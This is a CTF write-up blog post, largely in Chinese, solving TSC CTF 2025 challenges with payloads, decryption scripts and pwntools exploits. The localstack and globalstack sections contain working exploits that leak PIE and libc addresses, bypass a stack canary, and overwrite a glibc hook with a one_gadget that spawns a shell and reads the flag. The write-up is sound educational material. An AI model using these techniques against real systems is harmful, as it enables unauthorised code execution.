---
title: TSC CTF 2025 WriteUP
date: 2025-01-27 22:00:07
tags: 
    - ctf
excerpt: gamble_bad_bad | What_Happened | Chill_checker | localstack | Globalstack
---

## TSC CTF 2025

### gamble_bad_bad

check jackpot_value == 777

蓋掉 buf[20]  777 -> jackpot_value

exp : `aaaaaaaaaaaaaaaaaaaa777`

![image](https://hackmd.io/_uploads/HyVWiVfw1l.png)

### What_Happened

![image](https://hackmd.io/_uploads/BkFufBMDJl.png)

```python
encrypted_flag = [
    0xFE, 0xF9, 0xE9, 0xD1, 0xE3, 0xF5, 0xFE, 0xC2, 0xC3, 0xC4, 0xC1, 0xF5, 
    0xD3, 0xC5, 0xDF, 0xF5, 0xEC, 0xC3, 0xD2, 0xF5, 0x98, 0xC5, 0xC7, 0xCF, 
    0xF5, 0x99, 0xD8, 0xD8, 0xC5, 0xD8, 0xD7
]

# XOR with 0xAA to decrypt
decrypted_flag = ''.join(chr(byte ^ 0xAA) for byte in encrypted_flag)
print(f"Decrypted Flag: {decrypted_flag}")
```

TSC{I_Think_you_Fix_2ome_3rror}

### Chill_checker

```python
def reverse_transform(a1):
    original_a1 = []
    for i in range(8):  # Loop for each character
        current_char = ord(a1[i]) - 65  # Convert to 0-based index
        shift = (31 * (i + 8)) % 26  # Calculate shift
        original_index = (current_char - shift) % 26  # Reverse shift, wrap within 0-25
        original_char = chr(original_index + 65)  # Convert back to ASCII
        original_a1.append(original_char)
    return ''.join(original_a1)

# Given transformed a1
transformed_a1 = "SGZIYIHW"
print("Original a1:", reverse_transform(transformed_a1))
```

>ENBFQVPZ

![截圖 2025-01-14 16.33.24](https://hackmd.io/_uploads/HJbv-jQD1e.png)

## localstack

看 Stack 大概是`oob`

pop , push 40 會出現
![截圖 2025-01-24 21.16.47](https://hackmd.io/_uploads/SyqafM-dJe.png)

+ `xinfo 93824992247152`
![截圖 2025-01-24 21.23.04](https://hackmd.io/_uploads/BJvr4Mb_kl.png)

可以看到這邊定位到 `__do_global_dtors_aux`

![截圖 2025-01-24 21.43.03](https://hackmd.io/_uploads/HyceFMb_Jx.png)

這邊 leak address 就可以算出 process 的 base address

1. 繼續 pop stack 可以看到他慢慢的往 低位置移動
![image](https://hackmd.io/_uploads/BJVBaEWuyx.png)

2. 多 pop 幾次就會到 ret function 了
![截圖 2025-01-25 00.23.19](https://hackmd.io/_uploads/BJdY0V-Oyl.png)

3. 最後再依序 push ret , print_flag 的 address 就可以bypass canary 跳到 print_flag function 去
![截圖 2025-01-25 01.22.42](https://hackmd.io/_uploads/S1Gd3B-OJx.png)

```python Exploit
from pwn import * 

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process("./localstack")
r= remote("172.31.1.2", 11100)

r.sendlineafter(b">>", b'pop')
r.sendlineafter(b">>", b'push 40')
r.sendlineafter(b">>", b'show') 

# 64
# main+472
# /root/pwn/tsc/localstack

# print_flag 0x1289

r.recvuntil("Stack top: ")

pie = int(r.recvline().strip())- 0x3d70

success("Base Address -> %s" % hex(pie))

# pause()

flag = pie + 0x1289
ret = pie + 0x15a1

for i in range(10):
    r.sendlineafter(b'>>', b'pop')

r.sendlineafter(">>",f"push {str(ret)}")
r.sendlineafter(">>",f"push {str(flag)}")
r.sendlineafter(b'>>',b'exit')


r.interactive()

```

TSC{1_g07_0_point_1n_D474_57ruc7ur3_d0_U_hAv3_anY_1d3a?_haha}

## Globalstack

先 [patch libc](https://blog.csdn.net/llovewuzhengzi/article/details/134234465)

```bash=
$patchelf --set-interpreter ./share/ld-2.31.so ./share/globalstack

$patchelf --replace-needed libc.so.6 ./share/libc-2.31.so ./share/globalstack
```

+ pop 一次後會 leak `<_IO_2_1_stdin>`
![截圖 2025-01-31 22.00.52](https://hackmd.io/_uploads/S1WiDI5uyl.png)
![截圖 2025-01-31 22.01.17](https://hackmd.io/_uploads/r1F3w8cdyg.png)
![截圖 2025-01-31 21.56.55](https://hackmd.io/_uploads/r1H388cdJe.png)

`__.*_hook@@GLIBC_2.2.5`
![截圖 2025-01-31 23.45.46](https://hackmd.io/_uploads/H1c4lu5_yx.png)
![截圖 2025-01-31 23.43.18](https://hackmd.io/_uploads/S1gso1_cdkx.png)

![截圖 2025-01-31 23.14.18](https://hackmd.io/_uploads/BkiAdP9O1g.png)

+ About hook
    1. [HOOK INTRO](https://zhuanlan.zhihu.com/p/535469996)
    2. [Heap Exploit](https://blog.csdn.net/weixin_43044226/article/details/125456331)
    3. https://wsxk.github.io/glic231#23-%E5%9C%A8%E6%B2%A1%E6%9C%89edit%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E5%8A%AB%E6%8C%81free_hook-
    4. https://blog.csdn.net/neilooo/article/details/102331803
    5. https://hack1s.fun/posts/heappwn-13
+ one_gadget `execve("/bin/sh", r15, rdx)`
+ Ans: call `<__after_morecore_hook>` 後加上 gadget

```python=
#!/usr/bin/python3

from pwn import * 
import warnings

warnings.filterwarnings("ignore", category=BytesWarning)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process("./share/globalstack")
#r= remote("172.31.1.2", 11101)

r.sendlineafter(b'>> ',b'pop')
r.sendlineafter(b'>> ',b'pop')

r.recvuntil(b'Popped ')

base = int(r.recvuntil(b" "))- 0x1ec980 # <_IO_2_1_stdin_> : `readelf -r share/libc-2.31.so | grep _IO`

success("Libc base -> %s" % hex(base)) 

r.sendlineafter(b'>> ',b'pop') # 0
r.sendlineafter(b'>> ',b'pop') # Top 93824992247824
r.sendlineafter(b'>> ',b'pop') # 93824992247816
r.sendlineafter(b'>> ',b'pop') # <__cxa_finalize>

amhook = base + 0x1eee40
libc_sh = base + 0xe3b01 # execve("/bin/sh", r15, rdx)

log.info("free_hook -> %s" % hex(amhook))
log.info("sh -> %s" % hex(libc_sh))

# pause()

r.sendlineafter(b'>> ',f"push {str(amhook)}") # __after_morecore_hook
r.sendlineafter(b'>> ',f"push {str(libc_sh)}")
r.sendlineafter(b'>> ',b'exit')
r.sendline(b'cat /home/$(whoami)/flag')

r.interactive()
```

TSC{fr33_h00k_1s_nO_L0ng3r_fr33_AFt3r_Glibc_2.34_^_^_2d9e302796bcf60e}

## Other Writeup

[pwn2ooown](https://github.com/pwn2ooown/My-CTF-Challenges-Public/tree/main/2025_TSCCTF)